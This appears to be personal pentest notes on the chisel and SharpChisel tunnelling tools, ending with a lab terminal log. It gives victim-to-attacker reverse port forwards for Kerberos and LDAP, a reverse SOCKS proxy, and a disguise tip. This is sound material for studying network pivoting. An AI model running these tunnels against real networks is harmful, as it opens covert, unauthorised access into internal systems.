chisel

go get -v github.com/jpillora/chisel

================================================================
================================================================


# forward port 389 and 88 to hacker computer
user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 

# SOCKS
user@victim$ .\chisel.exe client YOUR_IP:8008 R:socks

SharpChisel

A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel

user@hacker$ ./chisel server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"

================================================================
================================================================

server : run the Server Component of chisel 
-p 8080 : run server on port 8080
--key "private": use "private" string to seed the generation of a ECDSA public and private key pair
--auth "user:pass" : Creds required to connect to the server
--reverse:  Allow clients to specify reverse port forwarding remotes in addition to normal remotes.
--proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight.

user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/19/2022   8:52 PM        8230912 chisel.exe                                                            


PS C:\temp> dir
dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/19/2022   8:52 PM        8230912 chisel.exe                                                            


PS C:\temp> ./chisel.exe clien 10.10.14.3:6969 R:socks
./chisel.exe clien 10.10.14.3:6969 R:socks

  Usage: chisel [command] [--help]

  Version: 1.7.7 (go1.17.6)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel

PS C:\temp> ./chisel.exe client 10.10.14.3:6969 R:socks
./chisel.exe client 10.10.14.3:6969 R:socks
2022/04/20 20:58:29 client: Connecting to ws://10.10.14.3:6969
2022/04/20 20:58:30 client: Connected (Latency 156.9076ms)


